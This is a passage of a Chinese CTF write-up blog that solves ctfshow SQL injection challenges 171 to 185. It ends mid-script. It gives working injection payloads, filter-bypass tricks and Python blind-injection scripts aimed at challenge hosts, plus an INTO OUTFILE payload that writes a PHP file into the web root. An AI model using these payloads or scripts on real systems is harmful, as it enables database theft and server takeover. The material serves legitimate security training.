class="sidebar-link">应急响应-linux入侵排查</a></li><li><a href="/pages/02e0b4/" class="sidebar-link">应急响应-apahce日志分析</a></li><li><a href="/pages/ggssrf/" class="sidebar-link">国光SSRF靶场打穿内网</a></li><li><a href="/pages/actf2025/" class="sidebar-link">ACTF2025 web部分题解</a></li><li><a href="/pages/ctfshow-websec/" class="sidebar-link">CTFshow web应用安全与防护 wp</a></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><span data-v-06225672>wp</span></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://the0n3.top" target="_blank" title="作者" class="beLink" data-v-06225672>the0n3</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2024-05-22</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">ctfshow web sql注入171-253<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="ctfshow-web-sql注入171-253"><a href="#ctfshow-web-sql注入171-253" class="header-anchor">#</a> ctfshow web sql注入171-253</h1> <p>参考:</p> <ul><li><a href="https://fushuling.com/index.php/2023/08/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/" target="_blank" rel="noopener noreferrer"> fushulingのblog<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://blog.csdn.net/qq_50589021/article/details/119861887" target="_blank" rel="noopener noreferrer">ctfshow web入门 sql注入(超详解)201-250<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <h2 id="web-171"><a href="#web-171" class="header-anchor">#</a> web 171</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select username,password from user where username !='flag' and id = '&quot;</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;' limit 1;&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>字符型注入。没有过滤，直接万能密码</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>1' or '1'='1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-172"><a href="#web-172" class="header-anchor">#</a> web 172</h2> <p>用户名过滤了'flag'，flag的值在password字段里，联合查询</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>-1'union select 1,password from ctfshow_user2%23
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-173"><a href="#web-173" class="header-anchor">#</a> web 173</h2> <p>查询结果不能有flag，flag是username字段里的值，不查username就可以了。注意这题三个参数</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>1'union select 1,2,password from ctfshow_user3%23 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-174"><a href="#web-174" class="header-anchor">#</a> web 174</h2> <p>方法1 :盲注</p> <p>通过查询flag的每一位和字符来比较</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
flag <span class="token operator">=</span> <span class="token string">''</span>
table <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> <span class="token string">'-{}'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> table<span class="token punctuation">:</span>
        <span class="token comment"># url去掉s  接口在网络面板里可以看到</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://f4b0bf5f-7277-4562-964d-cbe5e5737fb6.challenge.ctf.show/api/v4.php?id=&quot;</span>
        payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''1' and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),{},1)=&quot;{}&quot;--+'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;admin&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>方法2：结果里过滤了数字，使用sql语句里的replace替换成其他字符，查询后再替换回去</p> <p>payload</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>1'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'1','nba'),'2','nbb'),'3','nbc'),'4','nbd'),'5','nbe'),'6','nbf'),'7','nbg'),'8','nbh'),'9','nbi'),'0','nbj'),'a' from ctfshow_user4 where username='flag'--+
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>还原脚本</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>nb<span class="token operator">=</span><span class="token string">'nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbhnbfnbbnbcnbcnbcnbenbfnbbnbfnbenbfnbcnbfnbanbbDnbcnbcnbcnbgnbcnbgnbfnbdnbbDnbcnbdnbcnbbnbfnbfnbcnbhnbbDnbcnbhnbfnbanbfnbdnbcnbdnbbDnbcnbfnbfnbcnbfnbanbfnbbnbcnbgnbcnbhnbcnbenbfnbfnbcnbcnbcnbdnbfnbanbfnbbnbgD'</span>

nb<span class="token operator">=</span>nb<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nba'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbb'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbc'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbd'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbe'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbf'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbg'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbh'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbi'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'nbj'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&quot;ascii&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="web-175"><a href="#web-175" class="header-anchor">#</a> web 175</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>这个正则匹配了所有的ascll码，ascll码0-127的字符都被过滤了(字母数字字符)</p> <p>解法1：；盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
flag <span class="token operator">=</span> <span class="token string">''</span>
table <span class="token operator">=</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> <span class="token string">'-{}'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> table<span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://f4b0bf5f-7277-4562-964d-cbe5e5737fb6.challenge.ctf.show/api/v4.php?id=&quot;</span>
        payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''1' and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),{},1)=&quot;{}&quot;--+'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;admin&quot;</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>解法二：将查询结果写进文件，或者写个木马进去</p> <p>payload</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment"># 将结果写到文件</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,password from ctfshow_user5 into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>txt<span class="token string">'%23
# 写马
-1'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/1.php'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="web-176"><a href="#web-176" class="header-anchor">#</a> web 176</h2> <p>这题过滤了小写的‘select’，在sql中，关键字不区分大小写</p> <p>payload</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">SElect</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user <span class="token comment">--+</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-177"><a href="#web-177" class="header-anchor">#</a> web 177</h2> <p>过滤了空格</p> <p>常见绕过空格的方式</p> <ul><li><code>/**/</code></li> <li><code>%0a</code></li> <li><code>%0b</code></li> <li><code>%0c</code></li> <li><code>%0d</code></li> <li><code>%09</code></li> <li><code>(字段名)</code></li></ul> <p>payload</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span>'<span class="token keyword">union</span><span class="token operator">%</span><span class="token number">09</span>select<span class="token operator">%</span><span class="token number">091</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token operator">%</span><span class="token number">09</span>from<span class="token operator">%</span><span class="token number">09</span>ctfshow_user<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-178"><a href="#web-178" class="header-anchor">#</a> web 178</h2> <p>过滤了<code>/**/</code>注释符，上一题payload还能用</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span>'<span class="token keyword">union</span><span class="token operator">%</span><span class="token number">09</span>select<span class="token operator">%</span><span class="token number">091</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token operator">%</span><span class="token number">09</span>from<span class="token operator">%</span><span class="token number">09</span>ctfshow_user<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-179"><a href="#web-179" class="header-anchor">#</a> web 179</h2> <p>%09被过滤了，%0c还能用</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span>'<span class="token keyword">union</span><span class="token operator">%</span><span class="token number">0</span>cselect<span class="token operator">%</span><span class="token number">0</span>c1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password<span class="token operator">%</span><span class="token number">0</span>cfrom<span class="token operator">%</span><span class="token number">0</span>cctfshow_user<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-180"><a href="#web-180" class="header-anchor">#</a> web 180</h2> <p>过滤了注释符#，--，使用单引号闭合。同时使用group_concat函数将结果合并</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-181"><a href="#web-181" class="header-anchor">#</a> web 181</h2> <p>参考了大佬的文章，在mysql中，sql语句可以用符号表示逻辑运算符，||与or等效</p> <p>传入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span><span class="token string">'||username='</span>flag
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="web-182"><a href="#web-182" class="header-anchor">#</a> web 182</h2> <p>过滤了flag,sql正则匹配flag，圆括号包裹字段名</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">0</span><span class="token string">'||(username)regexp'</span>f
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>最后换为f,l,a,g都可以匹配到</p> <h2 id="web-183"><a href="#web-183" class="header-anchor">#</a> web 183</h2> <p>这题通过聚合函数count()，对查询的结果统计，来判断查询是否成功实现盲注。过滤了等号=，还有regexp正则和like模糊匹配</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#author:yu22x</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://0be2b54b-f4b2-4843-a369-5878015eeca6.challenge.ctf.show/select-waf.php&quot;</span>
s<span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">&quot;{_-}&quot;</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    data<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">'tableName'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'(ctfshow_user)where(pass)regexp(&quot;^ctfshow</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token operator">+</span>j<span class="token punctuation">}</span></span><span class="token string">&quot;)'</span></span>
    <span class="token punctuation">}</span>
    <span class="token comment">#print(data)</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token comment">#print(r.text)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;user_count = 1&quot;</span>  <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
      flag<span class="token operator">+=</span>j
      <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="web-184"><a href="#web-184" class="header-anchor">#</a> web 184</h2> <p>过滤了where，可以用group by having。过滤了引号可以用16进制</p> <p>通过pass字段分组，依次比较每一位字符的16进制，盲注出整个flag</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#author:yu22x</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://e48a8069-93a1-4f54-92fd-98bf6d2f2e64.challenge.ctf.show/select-waf.php&quot;</span>
s<span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">&quot;{_-}&quot;</span>
<span class="token keyword">def</span> <span class="token function">asc2hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a1 <span class="token operator">=</span> <span class="token string">''</span>
    a2 <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        a1<span class="token operator">+=</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    a2 <span class="token operator">=</span> a1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;0x&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> a2
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    d <span class="token operator">=</span> asc2hex<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'^ctfshow</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token operator">+</span>j<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    data<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">'tableName'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f' ctfshow_user group by pass having pass regexp(0x</span><span class="token interpolation"><span class="token punctuation">{</span>d<span class="token punctuation">}</span></span><span class="token string">)'</span></span>
    <span class="token punctuation">}</span>
    <span class="token comment">#print(data)</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token comment">#print(r.text)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;user_count = 1&quot;</span>  <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
      flag<span class="token operator">+=</span>j
      <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h2 id="web-185"><a href="#web-185" class="header-anchor">#</a> web 185</h2> <p>过滤了数字，可以使用布尔值构造数字，例如(true+true)=2。最后再用concat连接</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---------------+</span>
<span class="token operator">|</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---------------+</span>
<span class="token operator">|</span>             <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---------------+</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#author:yu22x</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url<span class="token operator">=</span><span class="token string">&quot;http://cc981786-8e5b-4934-a89c-86b6bc950e7d.challenge.ctf.show/select-waf.php&quot;</span>
s<span class="token operator">=</span><span class="token string">'0123456789abcdef-{}'</span>
<span class="token keyword">def</span> <span class="token function">convert</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">:</span>
  t<span class="token operator">=</span><span class="token string">'concat('</span>
  <span class="token keyword">for</span> s <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
    t<span class="token operator">+=</span> <span class="token string">'char(true'</span><span class="token operator">+</span><span class="token string">'+true'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'),'</span>
